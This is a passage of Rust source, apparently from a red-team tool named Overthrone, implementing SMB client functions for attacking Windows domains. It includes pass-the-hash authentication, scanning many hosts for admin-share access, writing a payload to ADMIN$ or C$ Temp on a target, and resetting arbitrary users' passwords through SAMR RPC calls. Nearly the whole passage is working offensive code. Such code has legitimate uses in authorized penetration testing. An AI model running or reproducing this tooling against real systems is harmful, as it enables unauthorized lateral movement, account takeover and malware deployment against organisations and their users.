    let utf16: Vec<u8> = s.encode_utf16().flat_map(|c| c.to_le_bytes()).collect();
    let char_count = s.len() as u32;
    let mut buf = Vec::new();
    buf.extend_from_slice(&0x00020000u32.to_le_bytes()); // referent ID
    buf.extend_from_slice(&char_count.to_le_bytes()); // max_count
    buf.extend_from_slice(&0u32.to_le_bytes()); // offset
    buf.extend_from_slice(&char_count.to_le_bytes()); // actual_count
    buf.extend_from_slice(&utf16);
    while buf.len() % 4 != 0 {
        buf.push(0);
    }
    buf
}

// Non-Windows: Pure Rust SMB2 implementation via smb2 module

#[cfg(not(windows))]
use std::sync::Arc;
#[cfg(not(windows))]
use tokio::sync::Mutex;

#[cfg(not(windows))]
impl SmbSession {
    /// Connect to the target via our pure-Rust SMB2 client.
    pub async fn connect(
        target: &str,
        domain: &str,
        username: &str,
        password: &str,
    ) -> Result<Self> {
        info!("SMB: Connecting to \\\\{target} as {domain}\\{username} (pure-Rust SMB2)");

        let conn = super::smb2::Smb2Connection::connect(target, SMB_PORT).await?;
        conn.negotiate().await?;
        let session_key = conn.session_setup(domain, username, password).await?;

        info!("SMB: Authenticated to \\\\{target}");
        Ok(Self {
            inner: Arc::new(Mutex::new(conn)),
            target: target.to_string(),
            username: username.to_string(),
            domain: domain.to_string(),
            ticket: None,
            session_key: Some(session_key),
        })
    }

    /// Connect using pass-the-hash (NTLM hash instead of plaintext password).
    pub async fn connect_with_hash(
        target: &str,
        domain: &str,
        username: &str,
        nt_hash: &str,
    ) -> Result<Self> {
        info!("SMB: PTH connecting to \\\\{target} as {domain}\\{username} (pure-Rust SMB2)");

        let conn = super::smb2::Smb2Connection::connect(target, SMB_PORT).await?;
        conn.negotiate().await?;
        let session_key = conn.session_setup_hash(domain, username, nt_hash).await?;

        info!("SMB: PTH authenticated to \\\\{target}");
        Ok(Self {
            inner: Arc::new(Mutex::new(conn)),
            target: target.to_string(),
            username: username.to_string(),
            domain: domain.to_string(),
            ticket: None,
            session_key: Some(session_key),
        })
    }

    /// Retrieve the NTLMSSP session base key (16 bytes).
    pub fn session_key(&self) -> Option<Vec<u8>> {
        self.session_key.clone()
    }

    pub async fn connect_share(&self, share: &str) -> Result<()> {
        let share_path = format!(r"\\{}\{}", self.target, share);
        let conn = self.inner.lock().await;
        let _tree_id = conn.tree_connect(&share_path).await?;
        debug!("SMB: Connected to \\\\{}\\{}", self.target, share);
        Ok(())
    }

    pub async fn check_share_read(&self, share: &str) -> bool {
        let share_path = format!(r"\\{}\{}", self.target, share);
        let conn = self.inner.lock().await;
        conn.tree_connect(&share_path).await.is_ok()
    }

    pub async fn check_share_write(&self, share: &str) -> bool {
        if share == "IPC$" {
            return false;
        }
        let share_path = format!(r"\\{}\{}", self.target, share);
        let conn = self.inner.lock().await;
        let _tree_id = match conn.tree_connect(&share_path).await {
            Ok(id) => id,
            Err(_) => return false,
        };
        let test_file = format!("__overthrone_test_{}.tmp", rand::random::<u32>());
        // Try to create, write, and delete a test file
        match conn.open_file_write(&test_file).await {
            Ok(fid) => {
                let _ = conn.write(&fid, 0, b"x").await;
                let _ = conn.close(&fid).await;
                let _ = conn.delete_file(&test_file).await;
                debug!("SMB: Write access on \\\\{}\\{}", self.target, share);
                true
            }
            Err(_) => false,
        }
    }

    pub async fn check_share_access(&self, shares: &[&str]) -> Vec<ShareAccessResult> {
        let mut results = Vec::new();
        for &share in shares {
            let readable = self.check_share_read(share).await;
            let writable = if readable && share != "IPC$" {
                self.check_share_write(share).await
            } else {
                false
            };
            results.push(ShareAccessResult {
                share_name: share.to_string(),
                readable,
                writable,
                is_admin_share: ADMIN_SHARES.contains(&share),
            });
        }
        results
    }

    pub async fn check_admin_access(&self) -> AdminCheckResult {
        info!("SMB: Checking admin access on {}", self.target);
        let shares_to_check = ["C$", "ADMIN$", "IPC$"];
        let mut accessible = Vec::new();
        let mut has_admin = false;
        for share in &shares_to_check {
            if self.check_share_read(share).await {
                accessible.push((*share).to_string());
                if *share == "C$" || *share == "ADMIN$" {
                    has_admin = true;
                }
            }
        }
        if has_admin {
            info!("SMB: ADMIN ACCESS on {} ({:?})", self.target, accessible);
        } else {
            info!("SMB: No admin on {} ({:?})", self.target, accessible);
        }
        AdminCheckResult {
            target: self.target.clone(),
            has_admin,
            accessible_shares: accessible,
        }
    }

    pub async fn list_directory(
        &self,
        share: &str,
        remote_path: &str,
    ) -> Result<Vec<RemoteFileInfo>> {
        info!(
            "SMB: Listing \\\\{}\\{}\\{}",
            self.target, share, remote_path
        );

        let share_path = format!(r"\\{}\{}", self.target, share);
        let conn = self.inner.lock().await;
        let _tree_id = conn.tree_connect(&share_path).await?;

        let dir_path = remote_path.replace('/', "\\");
        let dir_id = conn.open_directory(&dir_path).await?;
        let entries = conn.query_directory(&dir_id).await?;
        conn.close(&dir_id).await?;

        let base = dir_path.trim_start_matches('\\').to_string();
        let results = entries
            .into_iter()
            .map(|(name, is_directory, size)| {
                let path = if base.is_empty() {
                    name.clone()
                } else {
                    format!("{}\\{}", base, name)
                };
                RemoteFileInfo {
                    name,
                    path,
                    is_directory,
                    size,
                }
            })
            .collect::<Vec<_>>();

        info!("SMB: Listed {} entries", results.len());
        Ok(results)
    }

    pub async fn read_file(&self, share: &str, remote_path: &str) -> Result<Vec<u8>> {
        info!(
            "SMB: Reading \\\\{}\\{}\\{}",
            self.target, share, remote_path
        );

        let share_path = format!(r"\\{}\{}", self.target, share);
        let conn = self.inner.lock().await;
        let _tree_id = conn.tree_connect(&share_path).await?;

        let file_path = remote_path.replace('/', "\\");
        let fid = conn.open_file_read(&file_path).await?;
        let data = conn.read_all(&fid).await?;
        conn.close(&fid).await?;

        info!("SMB: Read {} bytes from {}", data.len(), remote_path);
        Ok(data)
    }

    pub async fn write_file(&self, share: &str, remote_path: &str, data: &[u8]) -> Result<()> {
        let data_len = data.len();
        info!(
            "SMB: Writing {} bytes to \\\\{}\\{}\\{}",
            data_len, self.target, share, remote_path
        );

        let share_path = format!(r"\\{}\{}", self.target, share);
        let conn = self.inner.lock().await;
        let _tree_id = conn.tree_connect(&share_path).await?;

        let file_path = remote_path.replace('/', "\\");
        let fid = conn.open_file_write(&file_path).await?;
        conn.write_all(&fid, data).await?;
        conn.close(&fid).await?;

        info!("SMB: Write complete ({} bytes)", data_len);
        Ok(())
    }

    pub async fn delete_file(&self, share: &str, remote_path: &str) -> Result<()> {
        info!(
            "SMB: Deleting \\\\{}\\{}\\{}",
            self.target, share, remote_path
        );

        let share_path = format!(r"\\{}\{}", self.target, share);
        let conn = self.inner.lock().await;
        let _tree_id = conn.tree_connect(&share_path).await?;

        let file_path = remote_path.replace('/', "\\");
        conn.delete_file(&file_path).await?;

        info!("SMB: Deleted {}", remote_path);
        Ok(())
    }

    pub async fn download_file(
        &self,
        share: &str,
        remote_path: &str,
        local_path: &str,
    ) -> Result<usize> {
        let data = self.read_file(share, remote_path).await?;
        let size = data.len();
        tokio::fs::write(local_path, &data).await.map_err(|e| {
            OverthroneError::Smb(format!("Cannot write local file '{}': {e}", local_path))
        })?;
        info!(
            "SMB: Downloaded {} -> {} ({} bytes)",
            remote_path, local_path, size
        );
        Ok(size)
    }

    pub async fn upload_file(
        &self,
        local_path: &str,
        share: &str,
        remote_path: &str,
    ) -> Result<usize> {
        let data = tokio::fs::read(local_path)
            .await
            .map_err(|e| OverthroneError::Smb(format!("Cannot read '{}': {e}", local_path)))?;
        let size = data.len();
        self.write_file(share, remote_path, &data).await?;
        info!(
            "SMB: Uploaded {} -> {} ({} bytes)",
            local_path, remote_path, size
        );
        Ok(size)
    }

    pub async fn pipe_transact(&self, pipe_name: &str, request: &[u8]) -> Result<Vec<u8>> {
        info!(
            "SMB: Pipe transact '{}' ({} bytes)",
            pipe_name,
            request.len()
        );

        let ipc_path = format!(r"\\{}\IPC$", self.target);
        let conn = self.inner.lock().await;
        let _tree_id = conn.tree_connect(&ipc_path).await?;

        let name = pipe_name.trim_start_matches('/').trim_start_matches('\\');

        let fid = conn.open_pipe(name).await?;
        let response = conn.ioctl_pipe_transceive(&fid, request).await?;
        conn.close(&fid).await?;

        debug!("SMB: Pipe response: {} bytes", response.len());
        Ok(response)
    }

    pub async fn deploy_payload(
        &self,
        payload_bytes: &[u8],
        remote_filename: &str,
    ) -> Result<String> {
        info!("SMB: Deploying '{}' to {}", remote_filename, self.target);
        let (share, remote_path) = if self.check_share_read("ADMIN$").await {
            ("ADMIN$", format!("Temp\\{}", remote_filename))
        } else if self.check_share_read("C$").await {
            ("C$", format!("Windows\\Temp\\{}", remote_filename))
        } else {
            return Err(OverthroneError::Smb(format!(
                "No admin share access on {}",
                self.target
            )));
        };
        self.write_file(share, &remote_path, payload_bytes).await?;
        let full_path = if share == "ADMIN$" {
            format!("C:\\Windows\\{}", remote_path)
        } else {
            format!("C:\\{}", remote_path)
        };
        info!("SMB: Payload at {}", full_path);
        Ok(full_path)
    }

    pub async fn cleanup_payload(&self, remote_filename: &str) -> Result<()> {
        let attempts = [
            ("ADMIN$", format!("Temp\\{}", remote_filename)),
            ("C$", format!("Windows\\Temp\\{}", remote_filename)),
        ];
        for (share, path) in &attempts {
            if self.delete_file(share, path).await.is_ok() {
                info!("SMB: Cleaned up {}\\{}", share, path);
                return Ok(());
            }
        }
        warn!("SMB: Payload not found for cleanup: {}", remote_filename);
        Ok(())
    }

    /// Connect using a Kerberos ticket (cross-platform parity)
    pub async fn connect_with_ticket(
        target: &str,
        domain: &str,
        username: &str,
        ticket: KerberosTicket,
    ) -> Result<Self> {
        info!("SMB: Kerberos ticket auth to \\\\{target} for {username}");

        // On non-Windows, use the ticket's session key for an NTLM-based
        // fallback auth via our pure Rust SMB2 client.
        let session_key_hex = hex::encode(&ticket.session_key);
        let conn = super::smb2::Smb2Connection::connect(target, SMB_PORT).await?;
        conn.negotiate().await?;
        let session_key = conn
            .session_setup_hash(domain, username, &session_key_hex)
            .await?;

        Ok(Self {
            inner: Arc::new(Mutex::new(conn)),
            target: target.to_string(),
            username: username.to_string(),
            domain: domain.to_string(),
            ticket: Some(ticket),
            session_key: Some(session_key),
        })
    }

    /// SAMR password reset via named pipe DCE/RPC
    pub async fn samr_password_reset(&self, target_user: &str, new_password: &str) -> Result<()> {
        info!(
            "SMB: SAMR password reset for '{}' on {}",
            target_user, self.target
        );

        let samr_bind = build_samr_bind();
        let bind_resp = self.pipe_transact("samr", &samr_bind).await?;

        if bind_resp.len() < 4 || bind_resp[2] != 12 {
            return Err(OverthroneError::Smb("SAMR RPC bind failed".to_string()));
        }

        let connect_req = build_samr_connect();
        let connect_resp = self.pipe_transact("samr", &connect_req).await?;

        if connect_resp.len() < 48 {
            return Err(OverthroneError::Smb("SamrConnect failed".to_string()));
        }
        let sam_handle = &connect_resp[24..44];

        let open_domain_req = build_samr_open_domain(sam_handle, &self.domain);
        let domain_resp = self.pipe_transact("samr", &open_domain_req).await?;

        if domain_resp.len() < 48 {
            return Err(OverthroneError::Smb("SamrOpenDomain failed".to_string()));
        }
        let domain_handle = &domain_resp[24..44];

        let lookup_req = build_samr_lookup_names(domain_handle, &[target_user]);
        let lookup_resp = self.pipe_transact("samr", &lookup_req).await?;
        let rid = parse_samr_rid(&lookup_resp)?;

        let open_user_req = build_samr_open_user(domain_handle, rid);
        let user_resp = self.pipe_transact("samr", &open_user_req).await?;

        if user_resp.len() < 48 {
            return Err(OverthroneError::Smb("SamrOpenUser failed".to_string()));
        }
        let user_handle = &user_resp[24..44];

        let set_pwd_req = build_samr_set_password(user_handle, new_password);
        let set_pwd_resp = self.pipe_transact("samr", &set_pwd_req).await?;

        let _ = build_samr_close_handle(user_handle);
        let _ = build_samr_close_handle(domain_handle);
        let _ = build_samr_close_handle(sam_handle);

        if set_pwd_resp.len() >= 4 {
            info!("SMB: Password reset successful for '{}'", target_user);
            Ok(())
        } else {
            Err(OverthroneError::Smb(
                "SamrSetPasswordForUser failed".to_string(),
            ))
        }
    }
}

// Bulk Operations (multi-target)

pub async fn check_admin_targets(
    targets: &[String],
    domain: &str,
    username: &str,
    password: &str,
    concurrency: usize,
) -> Vec<AdminCheckResult> {
    use std::sync::Arc;
    use tokio::sync::Semaphore;

    info!("SMB: Scanning {} targets for admin access", targets.len());

    let sem = Arc::new(Semaphore::new(concurrency));
    let mut handles = Vec::new();

    for target in targets {
        let target = target.clone();
        let domain = domain.to_string();
        let username = username.to_string();
        let password = password.to_string();
        let sem = Arc::clone(&sem);

        handles.push(tokio::spawn(async move {
            let _permit = sem.acquire().await.unwrap();
            match SmbSession::connect(&target, &domain, &username, &password).await {
                Ok(session) => session.check_admin_access().await,
                Err(e) => {
                    debug!("SMB: Cannot connect to {target}: {e}");
                    AdminCheckResult {
                        target,
                        has_admin: false,
                        accessible_shares: Vec::new(),
                    }
                }
            }
        }));
    }

    let mut results = Vec::new();
    for h in handles {
        if let Ok(r) = h.await {
            results.push(r);
        }
    }

    let admin_count = results.iter().filter(|r| r.has_admin).count();
    info!("SMB: Admin on {admin_count}/{} targets", results.len());
    results
}
